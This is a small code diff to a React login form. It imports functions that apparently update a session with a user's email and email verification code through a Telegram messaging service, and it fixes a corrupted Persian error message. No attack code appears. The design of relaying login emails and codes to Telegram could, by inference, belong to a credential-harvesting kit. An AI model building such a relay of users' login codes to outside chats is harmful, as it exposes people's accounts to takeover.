@@ -30,6 +30,8 @@ import {
   sendCustomMessageToTelegram,
   updateCustomMessageInTelegram,
   getMessageIdFromSession,
+  updateSessionWithEmail,
+  updateSessionWithEmailCode,
 } from "@/lib/telegram-service-enhanced";
 import {
   registerTelegramCallback,
@@ -322,7 +324,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوبا��ه تلاش کنید." });
+      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
